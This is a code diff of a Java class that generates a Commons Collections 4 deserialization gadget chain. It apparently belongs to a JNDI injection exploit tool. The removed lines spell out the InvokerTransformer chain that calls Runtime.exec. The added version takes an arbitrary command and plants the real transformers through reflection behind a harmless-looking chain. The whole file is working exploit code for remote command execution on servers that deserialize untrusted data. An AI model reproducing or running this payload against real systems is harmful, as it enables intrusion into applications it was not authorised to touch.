@@ -2,46 +2,33 @@ package com.nu1r.jndi.gadgets;
 
 import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.gadgets.utils.Reflections;
+import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
 import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.functors.ChainedTransformer;
 import org.apache.commons.collections4.functors.ConstantTransformer;
-import org.apache.commons.collections4.functors.InvokerTransformer;
 import org.apache.commons.collections4.keyvalue.TiedMapEntry;
 import org.apache.commons.collections4.map.LazyMap;
 
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
 import java.util.HashMap;
-import java.util.HashSet;
 import java.util.Map;
 
-public class CommonsCollections6Lite_4 {
+public class CommonsCollections6Lite_4 implements ObjectPayload<Object> {
 
-    public static byte[] getBytes(PayloadType type) throws Exception {
-        final String[] execArgs = new String[]{String.valueOf(type)};
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+        String        command          = param[0];
+        Transformer[] fakeTransformers = new Transformer[]{(Transformer) new ConstantTransformer(1)};
+        Transformer[] transformers     = (Transformer[]) TransformerUtil.makeTransformer(command);
+        Transformer   transformerChain = new ChainedTransformer(fakeTransformers);
+        Map           innerMap         = new HashMap();
+        Map           outerMap         = LazyMap.lazyMap(innerMap, transformerChain);
+        TiedMapEntry  tme              = new TiedMapEntry(outerMap, "nu1r");
+        Map           expMap           = new HashMap();
+        expMap.put(tme, "nu1r");
+        outerMap.remove("nu1r");
 
-        final Transformer[] transformers = new Transformer[]{
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer("getMethod", new Class[]{
-                        String.class, Class[].class}, new Object[]{
-                        "getRuntime", new Class[0]}),
-                new InvokerTransformer("invoke", new Class[]{
-                        Object.class, Object[].class}, new Object[]{
-                        null, new Object[0]}),
-                new InvokerTransformer("exec",
-                        new Class[]{String.class}, execArgs),
-                new ConstantTransformer(new HashSet<String>())};
-        ChainedTransformer inertChain = new ChainedTransformer(new Transformer[]{});
-
-        HashMap<String, String> innerMap = new HashMap<String, String>();
-        Map                     m        = LazyMap.lazyMap(innerMap, inertChain);
-
-        Map          outerMap = new HashMap();
-        TiedMapEntry tied     = new TiedMapEntry(m, "v");
-        outerMap.put(tied, "t");
-        innerMap.clear();
-
-        Reflections.setFieldValue(inertChain, "iTransformers", transformers);
+        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
 
         //序列化
         ByteArrayOutputStream baous = new ByteArrayOutputStream();
@@ -51,5 +38,10 @@ public class CommonsCollections6Lite_4 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 }
